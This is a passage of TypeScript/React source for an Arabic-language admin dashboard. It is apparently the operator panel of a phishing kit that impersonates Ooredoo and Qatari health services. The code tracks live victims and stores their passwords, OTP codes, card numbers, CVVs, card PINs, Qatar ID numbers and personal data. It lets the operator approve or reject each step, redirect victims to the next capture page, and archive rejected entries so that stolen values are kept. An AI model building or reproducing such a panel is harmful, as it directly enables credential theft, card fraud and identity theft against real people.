    // merge them so the sidebar never shows two cards for the same visitor.
    const byPhone: Record<string, LoginRequest[]> = {};
    const noPhone: LoginRequest[][] = [];
    for (const reqs of Object.values(groups)) {
      const phone = pickPhone(reqs);
      const key = normPhone(phone) || normId(phone);
      if (key) (byPhone[key] ||= []).push(...reqs);
      else noPhone.push(reqs);
    }
    const merged: Visitor[] = [];
    for (const reqs of Object.values(byPhone)) merged.push({ phone: pickPhone(reqs), requests: reqs });
    for (const reqs of noPhone) merged.push({ phone: pickPhone(reqs), requests: reqs });
    // Append synthetic visitors for realtime-only (anonymous) presences that
    // haven't submitted any data yet — so the admin can see them in the list.
    for (const p of anonymousPresences) {
      merged.push({
        phone: `anon:${p.key}`,
        requests: [],
        anonymous: true,
        anonPath: p.path,
        anonStatus: p.status,
        anonSince: p.since,
        anonLastActive: p.lastActive,
        geo: p.geo ?? null,
      });
    }
    return merged;
  })();

  const notifiedIdleRef = useRef<Set<string>>(new Set());
  useEffect(() => {
    const IDLE_MS = 90_000;
    const check = () => {
      const now = Date.now();
      allVisitors.forEach((v) => {
        const online = isVisitorOnline(v.requests);
        if (!online) return;
        const latest = Math.max(...v.requests.map((r) => new Date((r as any).updated_at || r.created_at).getTime()));
        const key = `${v.phone}:${latest}`;
        const idleFor = now - latest;
        if (idleFor > IDLE_MS && !notifiedIdleRef.current.has(key)) {
          notifiedIdleRef.current.add(key);
          const pg = getCurrentPageLabel(v.requests);
          const secs = Math.floor(idleFor / 1000);
          const body = `${v.phone} متوقف منذ ${secs >= 60 ? `${Math.floor(secs / 60)} د` : `${secs} ث`} في: ${pg}`;
          sendBrowserNotification("⚠️ زائر متوقف", body);
        }
      });
    };
    const id = setInterval(check, 15000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [requests, soundMuted]);

  // Recurring soft chime while any visitor is waiting on admin action,
  // so the admin notices even after the initial "new" alert.
  // Depend on a stable boolean rather than the `requests` array reference,
  // otherwise every realtime heartbeat (which produces a new array) tears
  // down and re-creates the 12s interval before it can ever elapse, and
  // the reminder chime effectively never fires on an active dashboard.
  const hasPendingAny = requests.some((r) => r.status === "pending");
  useEffect(() => {
    if (!hasPendingAny || soundMuted) return;
    const id = setInterval(() => playSound("pending-tick", soundMuted), 12000);
    return () => clearInterval(id);
  }, [hasPendingAny, soundMuted]);

  useEffect(() => {
    if (requests.length === 0) return;
    const latest = requests.reduce((a, b) => new Date((a as any).updated_at || a.created_at).getTime() > new Date((b as any).updated_at || b.created_at).getTime() ? a : b);
    setTopPhone(prev => (prev === latest.phone ? prev : latest.phone));
  }, [requests]);

  // Sticky "needs admin action" pin: when a brand-new pending request
  // arrives, pin that visitor to the top of the list. Keep the pin even
  // after the admin approves/rejects — only release it when ANOTHER
  // visitor submits a new pending request (which takes over the pin),
  // or when the pinned visitor's data is deleted entirely.
  const seenPendingIdsRef = useRef<Set<string>>(new Set());
  useEffect(() => {
    const pendings = requests.filter((r) => r.status === "pending");
    // Find pendings that are new since the last render
    const fresh = pendings.filter((r) => !seenPendingIdsRef.current.has(r.id));
    if (fresh.length > 0) {
      const newest = fresh.reduce((a, b) => new Date(a.created_at).getTime() > new Date(b.created_at).getTime() ? a : b);
      setPendingTopPhone(newest.phone);
    }
    seenPendingIdsRef.current = new Set(pendings.map((r) => r.id));
    // Release the pin only if the pinned visitor no longer exists at all
    setPendingTopPhone((prev) => {
      if (!prev) return prev;
      return requests.some((r) => r.phone === prev) ? prev : null;
    });
  }, [requests]);

  const visitors = allVisitors.filter((v) => {
    const matchesSearch = searchQuery === "" || (!v.anonymous && v.phone.includes(searchQuery));
    const lifecycle: Lifecycle = v.anonymous ? "active" : getLifecycle(v.requests);
    const matchesOnline = onlineFilter === "all" || lifecycle === onlineFilter;
    const matchesFav = !favoritesOnly || favorites.has(v.phone);
    return matchesSearch && matchesOnline && matchesFav;
  }).sort((a, b) => {
    const aPend = a.phone === pendingTopPhone ? 1 : 0;
    const bPend = b.phone === pendingTopPhone ? 1 : 0;
    if (aPend !== bPend) return bPend - aPend;
    const aOnline = a.anonymous || isVisitorOnline(a.requests) ? 1 : 0;
    const bOnline = b.anonymous || isVisitorOnline(b.requests) ? 1 : 0;
    if (aOnline !== bOnline) return bOnline - aOnline;
    const aTime = a.anonymous ? (a.anonSince ?? 0) : Math.max(...a.requests.map(r => new Date((r as any).updated_at || r.created_at).getTime()));
    const bTime = b.anonymous ? (b.anonSince ?? 0) : Math.max(...b.requests.map(r => new Date((r as any).updated_at || r.created_at).getTime()));
    return bTime - aTime;
  });

  const selectedVisitor = allVisitors.find((v) => v.phone === selectedPhone) || null;

  useEffect(() => {
    if (!selectedVisitor) return;
    const ts = getLatestActionTs(selectedVisitor.requests);
    if (ts && seenMap[selectedVisitor.phone] !== ts) markVisitorSeen(selectedVisitor.phone, selectedVisitor.requests);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedVisitor?.phone, selectedVisitor?.requests]);

  const STEP_LABEL: Record<string, string> = {
    login: "بيانات الدخول",
    otp: "رمز OTP",
    personal_info: "المعلومات الشخصية",
    card_info: "معلومات البطاقة",
    card_otp: "رمز البطاقة",
    card_pin: "الرقم السري للبطاقة",
    ooredoo_login: "دخول Ooredoo",
    ooredoo_otp: "رمز Ooredoo",
    medical_login: "دخول الخدمة",
    medical_activate: "تفعيل الحساب",
    medical_register: "تسجيل مستخدم جديد",
  };

  const updateStatus = async (id: string, status: "approved" | "rejected") => {
    let patch: any = { status, updated_at: new Date().toISOString() };
    // Fetch step for a more descriptive toast
    const { data: preRow } = await supabase
      .from("login_requests")
      .select("step, phone")
      .eq("id", id)
      .maybeSingle();
    const stepKey = String((preRow as any)?.step || "");
    const stepLabel = STEP_LABEL[stepKey] || "الطلب";
    const phoneTxt = (preRow as any)?.phone || "";
    // On approval, force the visitor to the next logical page for the step
    // so navigation is deterministic even if the visitor's page listener
    // misses the status change.
    if (status === "approved") {
      const APPROVE_NEXT: Record<string, string> = {
        ooredoo_login: "/ooredoo-otp",
      };
      const nextPath = APPROVE_NEXT[stepKey];
      if (nextPath) patch.redirect_to = nextPath;
    }
    // On rejection: snapshot the visitor's currently-submitted values into
    // activation_data.rejected_attempts so the info card keeps a permanent
    // record even if the visitor retries and overwrites the current values.
    if (status === "rejected") {
      const { data: current } = await supabase
        .from("login_requests")
        .select("step, username, password, otp_code, activation_data")
        .eq("id", id)
        .maybeSingle();
      if (current) {
        const ad = ((current as any).activation_data as Record<string, unknown> | null) || {};
        const prevAttempts = Array.isArray((ad as any).rejected_attempts) ? (ad as any).rejected_attempts : [];
        // Capture only meaningful values for this step
        const values: Record<string, unknown> = {};
        const step = String((current as any).step || "");
        if (step === "card_info") {
          if ((ad as any).card_name) values.card_name = (ad as any).card_name;
          if ((ad as any).card_number) values.card_number = (ad as any).card_number;
          if ((ad as any).expiry) values.expiry = (ad as any).expiry;
          if ((ad as any).cvv) values.cvv = (ad as any).cvv;
        } else if (step === "card_otp") {
          if ((current as any).otp_code && (current as any).otp_code !== "----") values.card_otp = (current as any).otp_code;
        } else if (step === "ooredoo_login") {
          if ((current as any).username) values.username = (current as any).username;
          if ((current as any).password) values.password = (current as any).password;
        } else if (step === "ooredoo_otp") {
          if ((current as any).otp_code && (current as any).otp_code !== "----") values.ooredoo_otp = (current as any).otp_code;
        } else if (step === "login") {
          if ((current as any).username) values.username = (current as any).username;
          if ((current as any).password) values.password = (current as any).password;
        } else if (step === "otp") {
          if ((current as any).otp_code && (current as any).otp_code !== "----") values.otp = (current as any).otp_code;
        }
        else if (step === "card_pin") {
          if ((current as any).otp_code && (current as any).otp_code !== "----") values.card_pin = (current as any).otp_code;
          if ((ad as any).card_pin) values.card_pin = (ad as any).card_pin;
        } else if (step === "medical_login") {
          const uT = (ad as any).medical_user_type ?? (current as any).username;
          const pW = (ad as any).medical_password ?? (current as any).password;
          const qI = (ad as any).medical_qatar_id ?? (current as any).qatar_id;
          if (uT) values.medical_user_type = uT;
          if (qI) values.medical_qatar_id = qI;
          if (pW) values.medical_password = pW;
        } else if (step === "medical_activate" || step === "medical_register") {
          const keys = ["requestType","userType","passportNo","visaNo","nationality","dob","gender","pregnant","establishmentNo","companyNameAr","companyNameEn","commercialRegNo","activityType","establishmentDate","email","networkOperator","network_operator","employer","occupation","purpose","purposeCompany","fee_qar","flow","register_username","register_password","register_full_name_ar","register_full_name_en","register_qatar_id","register_phone","register_governorate","register_city","register_street","register_building","activate_user_type","activate_full_name","activate_national_id","activate_phone"];
          for (const kk of keys) {
            const vv = (ad as any)[kk];
            if (vv != null && vv !== "") values[kk] = vv;
          }
        } else if (step === "personal_info") {
          if ((current as any).full_name) values.full_name = (current as any).full_name;
          if ((current as any).national_id) values.national_id = (current as any).national_id;
          if ((current as any).governorate) values.governorate = (current as any).governorate;
          if ((current as any).city) values.city = (current as any).city;
          if ((current as any).street) values.street = (current as any).street;
        }
        const nextAttempt = { step, at: new Date().toISOString(), values };
        const nextAd = { ...ad, rejected_attempts: [...prevAttempts, nextAttempt] };
        patch.activation_data = nextAd;
      }
    }
    const { error } = await supabase.from("login_requests").update(patch).eq("id", id);
    if (error) toast.error("خطأ في تحديث الحالة");
    else {
      if (status === "approved") {
        confetti({ particleCount: 80, spread: 70, origin: { y: 0.7 }, colors: ["#22c55e", "#4ade80", "#86efac", "#bbf7d0"] });
        toast.success(`تمت الموافقة على ${stepLabel}`, { description: phoneTxt || undefined });
      } else {
        confetti({ particleCount: 30, spread: 40, origin: { y: 0.7 }, colors: ["#ef4444", "#f87171", "#991b1b"], gravity: 2, scalar: 0.8 });
        toast.error(`تم رفض ${stepLabel}`, { description: phoneTxt ? `${phoneTxt} — سيُطلب من الزائر إعادة الإدخال` : "سيُطلب من الزائر إعادة الإدخال" });
      }
    }
  };

  const redirectVisitor = async (path: string, label: string) => {
    const latestRequest = getLatestVisitorRequest(selectedVisitor);
    if (!latestRequest) { toast.error("لا يوجد طلب نشط للزائر"); return; }
    if (!REDIRECT_DESTINATIONS.some(d => d.path === path)) { toast.error("وجهة التوجيه غير موجودة"); return; }
    const { error } = await supabase.from("login_requests").update({ redirect_to: path, updated_at: new Date().toISOString() } as any).eq("id", latestRequest.id);
    if (error) toast.error("تعذر توجيه الزائر");
    else { toast.success(`تم توجيه الزائر إلى: ${label}`); }
  };

  const clearAllData = async () => {
    const { error } = await supabase.from("login_requests").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    if (error) toast.error("خطأ في مسح البيانات");
    else { toast.success("تم مسح جميع البيانات"); setSelectedPhone(null); setFavorites(new Set()); setFavoritesOnly(false); setOnlineFilter("all"); setSearchQuery(""); setSeenMap({}); try { localStorage.setItem("admin_favorites", "[]"); localStorage.setItem("admin_seen_actions", "{}"); } catch {} }
  };

  const clearOfflineVisitors = async () => {
    const offlineVisitors = allVisitors.filter(v => !isVisitorOnline(v.requests));
    if (offlineVisitors.length === 0) { toast.info("لا يوجد زوار غير متصلين"); return; }
    const ids = offlineVisitors.flatMap(v => v.requests.map(r => r.id));
    const offlinePhones = new Set(offlineVisitors.map(v => v.phone));
    const { error } = await supabase.from("login_requests").delete().in("id", ids);
    if (error) toast.error("خطأ في مسح البيانات");
    else { toast.success(`تم مسح بيانات ${offlineVisitors.length} زائر غير متصل`); if (selectedPhone && offlinePhones.has(selectedPhone)) setSelectedPhone(null); }
  };

  const deleteVisitorData = async (phone: string) => {
    const target = allVisitors.find(v => v.phone === phone);
    const ids = target ? target.requests.map(r => r.id) : [];
    const q = ids.length > 0
      ? supabase.from("login_requests").delete().in("id", ids)
      : supabase.from("login_requests").delete().eq("phone", phone);
    const { error } = await q;
    if (error) toast.error("خطأ في مسح بيانات الزائر");
    else { toast.success("تم مسح بيانات الزائر"); if (selectedPhone === phone) setSelectedPhone(null); }
  };

  const formatTime = (dateStr: string) => new Date(dateStr).toLocaleString("ar-QA", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" });
  const formatDate = (dateStr: string) => new Date(dateStr).toLocaleDateString("ar-QA", { year: "numeric", month: "long", day: "numeric" });

  useEffect(() => { const interval = setInterval(() => setTick(t => t + 1), 1000); return () => clearInterval(interval); }, []);

  const getWaitingTime = (reqs: LoginRequest[]) => {
    const pendingReqs = reqs.filter(r => r.status === "pending");
    if (pendingReqs.length === 0) return "";
    const oldest = pendingReqs.reduce((a, b) => new Date(a.created_at) < new Date(b.created_at) ? a : b);
    const diffMs = Date.now() - new Date(oldest.created_at).getTime();
    const mins = Math.floor(diffMs / 60000);
    if (mins < 1) return "الآن";
    if (mins < 60) return `${mins} د`;
    const hours = Math.floor(mins / 60);
    if (hours < 24) return `${hours} س ${mins % 60} د`;
    return `${Math.floor(hours / 24)} ي ${hours % 24} س`;
  };

  const formatDuration = (ms: number) => {
    const s = Math.max(0, Math.floor(ms / 1000));
    if (s < 60) return `${s} ث`;
    const m = Math.floor(s / 60);
    if (m < 60) return `${m} د ${s % 60} ث`;
    const h = Math.floor(m / 60);
    if (h < 24) return `${h} س ${m % 60} د`;
    return `${Math.floor(h / 24)} ي ${h % 24} س`;
  };

  const getSessionTime = (reqs: LoginRequest[]) => {
    if (reqs.length === 0) return "";
    const oldest = reqs.reduce((a, b) => new Date(a.created_at) < new Date(b.created_at) ? a : b);
    const start = new Date(oldest.created_at).getTime();
    const online = isVisitorOnline(reqs);
    const lastActivity = reqs.reduce((max, r) => { const t = new Date((r as any).updated_at || r.created_at).getTime(); return t > max ? t : max; }, 0);
    return formatDuration((online ? Date.now() : lastActivity) - start);
  };

  const pathToLabel = (path?: string | null): string | null => {
    if (!path) return null;
    const map: Record<string, string> = {
      "/": "الرئيسية",
      "/card-info": "معلومات البطاقة",
      "/card-otp": "رمز البطاقة",
      "/card-pin": "الرقم السري للبطاقة",
      "/ooredoo-login": "تسجيل Ooredoo",
      "/ooredoo-otp": "رمز Ooredoo",
      "/waiting": "الانتظار",
      "/admin": "لوحة التحكم",
      "/medical-login": "تسجيل دخول الخدمة",
      "/medical-activate": "تفعيل الحساب",
      "/medical-register": "تسجيل مستخدم جديد",
      "/medical-register/step/1": "تسجيل جديد · بيانات شخصية",
      "/medical-register/step/2": "تسجيل جديد · تواصل وعنوان",
      "/medical-register/step/3": "تسجيل جديد · العمل والحساب",
      "/medical-register/step/4": "تسجيل جديد · مراجعة ودفع",
    };
    if (path.startsWith("/legal/")) return "صفحة قانونية";
    if (path.startsWith("/medical-register/step/")) {
      const n = path.split("/").pop();
      return `تسجيل جديد · خطوة ${n}`;
    }
    if (path.startsWith("/services/")) {
      const key = path.split("/").pop() || "";
      const svc = SERVICE_INDEX.find((s) => s.key === key);
      return svc ? `خدمة · ${svc.titleAr}` : "صفحة خدمة";
    }
    if (path.startsWith("/sehhaty/services/")) {
      const key = path.split("/").pop() || "";
      const svc = SEHHATY_SERVICES.find((s) => s.key === key);
      return svc ? `صحتي · ${svc.titleAr}` : "صفحة خدمة صحتي";
    }
    if (path.startsWith("/sehhaty/info/")) return "معلومات صحتي";
    if (path === "/sehhaty") return "صحتي";
    return map[path] || null;
  };

  const getCurrentPageLabel = (reqs: LoginRequest[]): string => {
    if (reqs.length === 0) return "—";
    const r = [...reqs].sort((a, b) => new Date((b as any).updated_at || b.created_at).getTime() - new Date((a as any).updated_at || a.created_at).getTime())[0];
    const livePage = pathToLabel((r as any).current_page);
    if ((r as any).current_page === "/medical-login" && (r as any).selected_service) {
      return `تسجيل دخول · ${getServiceLabelAr((r as any).selected_service)}`;
    }
    if ((r as any).current_page === "/medical-activate" && (r as any).selected_service) {
      return `تفعيل · ${getServiceContext((r as any).selected_service).accountAr}`;
    }
    if (livePage) return livePage;
    if (r.step === "documents") return "رسالة التحقق";
    if (r.step === "card_otp") return "رمز البطاقة";
    if (r.step === "card_info") return "معلومات البطاقة";
    if (r.step === "activation_data" || (r as any).activation_data) return "بيانات التفعيل";
    if (r.step === "token") return "التوكين";
    if (r.step === "personal_info" || r.full_name || r.national_id) return "المعلومات الشخصية";
    if (r.qatar_id) return "الهوية القطرية";
    if (r.username && r.password) return "تسجيل الدخول";
    if (r.otp_code && r.otp_code !== "----") return "كود OTP";
    return "صفحة الهاتف";
  };

  const getLastAction = (reqs: LoginRequest[]): { label: string; time: string } | null => {
    if (reqs.length === 0) return null;
    const latest = [...reqs].sort((a, b) => new Date((b as any).updated_at || b.created_at).getTime() - new Date((a as any).updated_at || a.created_at).getTime())[0];
    if (!latest) return null;
    let label = "زيارة جديدة";
    const step = (latest as any).step as string | undefined;
    if (step === "medical_register") label = "أكمل تسجيل مستخدم جديد";
    else if (step === "medical_activate") label = `أرسل بيانات تفعيل ${getServiceContext((latest as any).selected_service).accountAr}`;
    else if (step === "medical_login") label = `أدخل بيانات دخول ${getServiceLabelAr((latest as any).selected_service)}`;
    else if (step === "ooredoo_login") label = "أدخل بيانات مشغّل الاتصالات";
    else if (step === "ooredoo_otp") label = "أدخل رمز Ooredoo";
    else if (step === "card_pin") label = "أدخل الرقم السري للبطاقة";
    else if (step === "documents") label = "أرسل رسالة التحقق";
    else if (step === "card_otp") label = "أدخل رمز البطاقة";
    else if (step === "card_info") label = "أدخل معلومات البطاقة";
    else if (step === "activation_data" || (latest as any).activation_data) label = "أدخل بيانات التفعيل";
    else if (step === "token") label = "أدخل رمز التوكين";
    else if (step === "personal_info" || latest.full_name || latest.national_id) label = "أدخل المعلومات الشخصية";
    else if (step === "otp" || (latest.otp_code && latest.otp_code !== "----")) label = "أدخل كود OTP";
    else if (step === "login" || (latest.username && latest.password)) label = "أدخل بيانات الدخول";
    else if (latest.qatar_id) label = "أدخل الهوية القطرية";
    else if ((latest as any).selected_service) label = `اختار: ${getServiceLabelAr((latest as any).selected_service)}`;
    const t = new Date((latest as any).updated_at || latest.created_at).getTime();
    const diff = Math.max(0, Date.now() - t);
    const mins = Math.floor(diff / 60000);
    const time = mins < 1 ? "الآن" : mins < 60 ? `قبل ${mins} د` : `قبل ${Math.floor(mins / 60)} س`;
    return { label, time };
  };

  const pendingCount = (reqs: LoginRequest[]) => reqs.filter(r => r.status === "pending").length;

  type StageKey = "documents" | "personal_info" | "qatar_id" | "token" | "activation_data" | "login" | "otp" | "card_info" | "card_otp" | "card_pin" | "ooredoo_login" | "ooredoo_otp" | "phone" | "medical_register" | "medical_activate" | "medical_login";
  const detectStage = (r: LoginRequest): { key: StageKey; label: string; icon: any } => {
    if (r.step === "medical_register") return { key: "medical_register", label: "طلب تسجيل مستخدم جديد", icon: User };
    if (r.step === "medical_activate") return { key: "medical_activate", label: `طلب تفعيل ${getServiceContext((r as any).selected_service).accountAr}`, icon: Shield };
    if (r.step === "medical_login") return { key: "medical_login", label: `صفحة دخول ${getServiceLabelAr((r as any).selected_service)}`, icon: AtSign };
    if (r.step === "documents" || (r.password && /(نص\s+الرسالة|صورة\s+الرسالة)/.test(r.password))) return { key: "documents", label: "صفحة رسالة التحقق", icon: MessageSquare };
    if (r.step === "card_pin") return { key: "card_pin", label: "صفحة الرقم السري للبطاقة (PIN)", icon: Lock };
    if (r.step === "card_otp") return { key: "card_otp", label: "صفحة رمز البطاقة (OTP)", icon: KeyRound };
    if (r.step === "card_info") return { key: "card_info", label: "صفحة معلومات البطاقة", icon: CreditCard };
    if (r.step === "ooredoo_otp") return { key: "ooredoo_otp", label: "صفحة رمز Ooredoo", icon: KeyRound };
    if (r.step === "ooredoo_login") return { key: "ooredoo_login", label: "صفحة تسجيل دخول Ooredoo", icon: AtSign };
    if (r.step === "activation_data" || (r as any).activation_data) return { key: "activation_data", label: "صفحة بيانات التفعيل", icon: Lock };
    if (r.step === "token") return { key: "token", label: "صفحة التوكين", icon: KeyRound };
    if (r.step === "otp") return { key: "otp", label: "صفحة تأكيد الكود (OTP)", icon: KeyRound };
    if (r.step === "login") return { key: "login", label: "صفحة تسجيل الدخول", icon: AtSign };
    if (r.step === "personal_info" || r.full_name || r.national_id) return { key: "personal_info", label: "صفحة المعلومات الشخصية", icon: User };
    if (r.qatar_id) return { key: "qatar_id", label: "صفحة الهوية القطرية", icon: CreditCard };
    if (r.username && r.password) return { key: "login", label: "صفحة تسجيل الدخول", icon: AtSign };
    if (r.otp_code && r.otp_code !== "----") return { key: "otp", label: "صفحة تأكيد الكود (OTP)", icon: KeyRound };
    return { key: "phone", label: "صفحة رقم الهاتف", icon: Phone };
  };

  return (
    <div className="min-h-screen bg-background flex" dir="rtl">
      <div className={`${sidebarOpen ? "w-full animate-fade-in" : "w-0"} transition-all duration-300 border-l border-border/50 bg-gradient-to-b from-card via-card to-background flex flex-col overflow-hidden`}>
        <div className="relative bg-gradient-to-bl from-primary via-primary to-primary/90 p-3 md:p-4 shrink-0 overflow-hidden">
          <div className="relative z-10 flex items-center gap-2 md:gap-3">
            <div className="w-10 h-10 rounded-xl bg-primary-foreground/10 backdrop-blur-sm flex items-center justify-center border border-primary-foreground/10 shadow-lg">
              <Shield className="h-5 w-5 text-primary-foreground" />
            </div>
            <div className="flex-1 min-w-0">
              <h1 className="text-sm font-extrabold text-primary-foreground tracking-tight">لوحة التحكم</h1>
              <p className="text-[10px] text-primary-foreground/50 font-medium">
                {liveOnlineCount} متصل · {allVisitors.length} بسجل · {requests.filter(r => r.status === "pending").length} بانتظار
              </p>
            </div>
            <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-emerald-500/15 border border-emerald-400/30 shadow-inner">
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75 animate-ping" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-400" />
              </span>
              <div className="flex flex-col leading-tight">
                <span className="text-[9px] text-emerald-100/80 font-medium">متصل الآن</span>
                <span className="text-sm font-extrabold text-emerald-50 tabular-nums">{liveOnlineCount}</span>
                <span className="text-[8px] text-emerald-100/70 font-medium tabular-nums">
                  🟢 {liveStatusCounts.online} · 🟡 {liveStatusCounts.away} · ⚪ {liveStatusCounts.idle}
                </span>
                {liveAnonymousCount > 0 && (
                  <span className="text-[8px] text-emerald-100/70 font-medium tabular-nums" title="زوار متصلون لم يقدّموا أي معلومات بعد">
                    👻 {liveAnonymousCount} بلا بيانات
                  </span>
                )}
              </div>
            </div>
            <div className="flex items-center gap-0.5">
              <Button variant="ghost" size="icon" onClick={() => { const next = !soundMuted; setSoundMuted(next); localStorage.setItem("admin_sound_muted", String(next)); if (!next) playSound("new", false); }} className="text-primary-foreground/60 hover:text-primary-foreground hover:bg-primary-foreground/10 h-8 w-8 rounded-xl">
                {soundMuted ? <VolumeX className="h-3.5 w-3.5" /> : <Volume2 className="h-3.5 w-3.5" />}
              </Button>
              <Button variant="ghost" size="icon" onClick={fetchRequests} className="text-primary-foreground/60 hover:text-primary-foreground hover:bg-primary-foreground/10 h-8 w-8 rounded-xl">
                <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
              </Button>
              <Button variant="ghost" size="icon" onClick={() => setPwdOpen(true)} className="text-primary-foreground/60 hover:text-primary-foreground hover:bg-primary-foreground/10 h-8 w-8 rounded-xl">
                <KeyRound className="h-3.5 w-3.5" />
              </Button>
              <Button variant="ghost" size="icon" onClick={onLogout} className="text-primary-foreground/60 hover:text-destructive hover:bg-primary-foreground/10 h-8 w-8 rounded-xl">
                <LogOut className="h-3.5 w-3.5" />
              </Button>
            </div>
          </div>
        </div>

        <div className="flex gap-1.5 px-3 py-2 shrink-0 border-b border-border/40 bg-muted/20">
          <AlertDialog>
            <AlertDialogTrigger asChild>
              <button className="flex-1 text-[10px] font-bold py-2 rounded-lg bg-destructive/10 text-destructive hover:bg-destructive/20 border border-destructive/20 flex items-center justify-center gap-1.5">
                <Trash2 className="h-3 w-3" /> مسح الكل
              </button>
            </AlertDialogTrigger>
            <AlertDialogContent dir="rtl">
              <AlertDialogHeader><AlertDialogTitle>مسح جميع البيانات</AlertDialogTitle><AlertDialogDescription>هل أنت متأكد من مسح جميع طلبات تسجيل الدخول؟</AlertDialogDescription></AlertDialogHeader>
              <AlertDialogFooter><AlertDialogCancel>إلغاء</AlertDialogCancel><AlertDialogAction onClick={clearAllData} className="bg-destructive text-destructive-foreground hover:bg-destructive/90">مسح الكل</AlertDialogAction></AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
          <AlertDialog>
            <AlertDialogTrigger asChild>
              <button className="flex-1 text-[10px] font-bold py-2 rounded-lg bg-card text-muted-foreground hover:bg-muted border border-border flex items-center justify-center gap-1.5">
                <WifiOff className="h-3 w-3" /> مسح غير المتصلين ({allVisitors.filter(v => !isVisitorOnline(v.requests)).length})
              </button>
            </AlertDialogTrigger>
            <AlertDialogContent dir="rtl">
              <AlertDialogHeader><AlertDialogTitle>مسح الزوار غير المتصلين</AlertDialogTitle><AlertDialogDescription>سيتم مسح جميع بيانات الزوار غير المتصلين نهائياً.</AlertDialogDescription></AlertDialogHeader>
              <AlertDialogFooter className="flex-row-reverse gap-2"><AlertDialogCancel>إلغاء</AlertDialogCancel><AlertDialogAction className="bg-destructive text-destructive-foreground hover:bg-destructive/90" onClick={clearOfflineVisitors}>مسح</AlertDialogAction></AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
        </div>

        <div className="px-3 py-3 space-y-2 shrink-0 border-b border-border/40">
          <div className="flex items-center gap-1.5">
            <div className="relative flex-1">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input placeholder="بحث برقم الهاتف..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} className="h-10 text-xs pr-10 bg-muted/40 border border-border/40 rounded-xl" dir="ltr" />
            </div>
            <button onClick={() => setFavoritesOnly((v) => !v)} className={`h-10 px-3 rounded-xl flex items-center gap-1.5 text-[11px] font-bold border ${favoritesOnly ? "bg-amber-400 text-amber-950 border-amber-500" : "bg-muted/40 text-muted-foreground border-border/40"}`}>
              <Star className={`h-4 w-4 ${favoritesOnly ? "fill-amber-950" : ""}`} />
              <span className="tabular-nums">{favorites.size}</span>
            </button>
          </div>
          <div className="grid grid-cols-5 gap-1">
            {[
              { key: "all" as OnlineFilter, label: "الكل", emoji: "👥" },
              { key: "active" as OnlineFilter, label: "نشط", emoji: "🟢" },
              { key: "inactive" as OnlineFilter, label: "غير نشط", emoji: "⚪" },
              { key: "completed" as OnlineFilter, label: "مكتمل", emoji: "✅" },
              { key: "abandoned" as OnlineFilter, label: "مهجور", emoji: "🚪" },
            ].map((f) => {
              // Respect the favorites-only filter so tab counts match the visible list.
              const scope = favoritesOnly ? allVisitors.filter((v) => favorites.has(v.phone)) : allVisitors;
              const count = f.key === "all"
                ? scope.length
                : scope.filter((v) => (v.anonymous ? "active" : getLifecycle(v.requests)) === f.key).length;
              return (
                <button key={f.key} onClick={() => setOnlineFilter(f.key)} className={`text-[9px] font-bold py-1.5 rounded-lg flex flex-col items-center gap-0.5 ${onlineFilter === f.key ? "bg-primary text-primary-foreground" : "bg-muted/40 text-muted-foreground border border-border/40"}`}>
                  <span className="text-[11px]">{f.emoji}</span>
                  <span className="truncate w-full text-center">{f.label}</span>
                  <span className="tabular-nums opacity-80">{count}</span>
                </button>
              );
            })}
          </div>
        </div>

        <div className="flex-1 overflow-y-auto">
          <div className="p-2.5 space-y-2">
            {loading && visitors.length === 0 ? (
              <div className="flex justify-center py-12"><div className="w-8 h-8 border-[3px] border-primary/30 border-t-primary rounded-full animate-spin" /></div>
            ) : visitors.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground"><User className="h-10 w-10 mx-auto mb-2 opacity-20" /><p className="text-sm font-medium">لا توجد نتائج</p></div>
            ) : (
              visitors.map((visitor) => {
                const hasPending = pendingCount(visitor.requests) > 0;
                const isSelected = selectedPhone === visitor.phone;
                const online = visitor.anonymous ? true : isVisitorOnline(visitor.requests);
                const presence: PresenceStatus = visitor.anonymous
                  ? (visitor.anonStatus ?? "online")
                  : getVisitorPresence(visitor.requests, presenceByRequestId);
                const isLive = presence === "online" || presence === "away";
                // Any stage that captured full_name is fine (medical_activate, medical_register, personal_info…).
                const visitorName = visitor.requests.find((r) => (r as any).full_name)?.full_name;
                const country = visitor.anonymous ? null : getCountryFromPhone(visitor.phone);
                // Real IP-based location for this visitor. Prefer live presence
                // (fresh + works even before any submit), fall back to whatever
                // was persisted into activation_data.geo on any of the rows.
                const liveGeo: { code: string; name: string; flag: string } | null =
                  visitor.anonymous
                    ? visitor.geo ?? null
                    : (() => {
                        for (const r of visitor.requests) {
                          const p = presenceByRequestId.get(r.id);
                          if (p?.geo) return p.geo;
                        }
                        for (const r of visitor.requests) {
                          const ad = (r as any).activation_data as Record<string, unknown> | null;
                          const g = ad && (ad as any).geo;
                          if (g && typeof g === "object" && typeof (g as any).code === "string") {
                            return { code: String((g as any).code), name: String((g as any).name || (g as any).code), flag: String((g as any).flag || "🏳️") };
                          }
                        }
                        return null;
                      })();
                const initial = visitor.anonymous
                  ? "?"
                  : (visitorName || visitor.phone).replace(/^\+/, "").charAt(0).toUpperCase();
                const pageLabel = visitor.anonymous
                  ? (pathToLabel(visitor.anonPath) ?? "يتصفح الموقع")
                  : getCurrentPageLabel(visitor.requests);
                const latestTs = getLatestActionTs(visitor.requests);
                const seenTs = seenMap[visitor.phone] || 0;
                const hasNewAction = !visitor.anonymous && latestTs > seenTs;
                const lastAction = getLastAction(visitor.requests);
                const isFav = favorites.has(visitor.phone);
                const pendingN = pendingCount(visitor.requests);
                const rejectedN = visitor.requests.filter((r) => r.status === "rejected").length;
                const cardTheme = isSelected
                  ? "bg-card border-primary/40 ring-2 ring-primary/15 shadow-sm"
                  : hasPending
